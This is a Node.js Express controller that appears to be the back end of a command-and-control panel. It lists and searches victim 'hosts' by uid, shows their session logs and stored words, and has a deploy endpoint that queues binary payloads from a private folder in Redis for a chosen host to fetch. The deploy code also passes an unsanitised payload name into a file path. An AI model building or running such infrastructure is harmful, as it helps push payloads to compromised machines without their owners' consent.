const fs = require('fs');
const crypto = require('crypto');
const util = require('util');
const read_file = util.promisify(fs.readFile);
const msgpack = require('msgpack-lite');
const pako = require('pako');
const Redis = require("ioredis");
const redis = new Redis();
const Config = require('../config');
const Host = require('../models/host');
const Session = require('../models/session');
exports.verify = (req, res, next) => {
    const api_key = req.header("x-api-key");
    if(api_key !== Config.api_key){
        return res.status(403).send("x-api-key missing or error.");
    }
    next();
}
exports.list = async (req, res, next) => {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 10;

    // Calculate the number of documents to skip
    const skip = (page - 1) * limit;

    try {
        // Find documents with pagination
        let docs = await Host
            .find({}, { _id: 0, _v: 0, __v: 0 })
            .skip(skip)
            .limit(limit)
            .exec();

        // Optional: Get the total count of documents for pagination metadata
        const count = await Host.countDocuments({});

        // Send response with documents and pagination metadata
        return res.send({
            total: count,
            page: page,
            totalPages: Math.ceil(count / limit),
            limit: limit,
            docs: docs,
        });
    } catch (err) {
        // Handle errors
        return res.status(500).send({message: 'host not found'});
    }
}
exports.delete = async (req, res, next) => {
    let doc = await Host.findOneAndRemove({'uid': req.body.uid}).exec();
    if (!doc) {
        return res.status(500).send({message: 'host not found'});
    }
        return res.send({message: 'host deleted.'});
}
exports.note = async (req, res, next) => {
    let doc = await Host.set_note(req.body.uid, req.body.note);
    if (!doc) {
        return res.status(500).send({message: 'host not found'});
    }
    return res.send(doc);
}
exports.search = async (req, res, next) => {
    const page = parseInt(req.body.page) || 1;
    const limit = parseInt(req.body.limit) || 10;

    // Calculate the number of documents to skip
    const skip = (page - 1) * limit;

    try {
        // Find documents with pagination and search criteria
        let docs = await Host
            .find({ words: new RegExp(req.body.word, 'i') }, { _id: 0, _v: 0, __v: 0 })
            .skip(skip)
            .limit(limit)
            .exec();

        // Optional: Get the total count of documents for pagination metadata
        const count = await Host.countDocuments({ words: new RegExp(req.body.word, 'i') });

        // Send response with documents and pagination metadata
        return res.send({
            total: count,
            page: page,
            totalPages: Math.ceil(count / limit),
            limit: limit,
            docs: docs,
        });
    } catch (err) {
        // Handle errors
        return next(err);
    }

}
exports.log = async (req, res, next) => {
    // Default values for page and limit in case they are not provided in the JSON body
    const page = parseInt(req.body.page) || 1;
    const limit = parseInt(req.body.limit) || 10;

    // Calculate the number of sessions to skip
    const skip = (page - 1) * limit;

    try {
        let doc = await Session.findOne({ 'uid': req.body.uid }).exec();

        if (!doc || !doc.sessions || doc.sessions.length < 1) {
            return res.status(500).send({ message: 'log not found' });
        }

        // Paginate the sessions
        const paginatedSessions = doc.sessions.slice(skip, skip + limit);

        // Optional: Get the total count of sessions for pagination metadata
        const totalSessions = doc.sessions.length;

        // Send response with sessions and pagination metadata
        return res.send({
            total: totalSessions,
            page: page,
            totalPages: Math.ceil(totalSessions / limit),
            limit: limit,
            sessions: paginatedSessions,
        });
    } catch (err) {
        // Handle errors
        return res.status(500).send({ message: 'log not found' });
    }
}
exports.deploy = async (req, res, next) => {
    if(!fs.existsSync(`./private/${req.body.payload}.bin`)){
        return res.status(500).send({message: 'payload not found'});
    }
    const buf = await read_file(`./private/${req.body.payload}.bin`);
    const uid_hash = crypto.createHash('md5').update(req.body.uid).digest('hex');
    redis.lpush(uid_hash,msgpack.encode([1,buf]));
    redis.expire(uid_hash, 86400);
    return res.status(200).send({message: `${req.body.payload} deployed.`});
}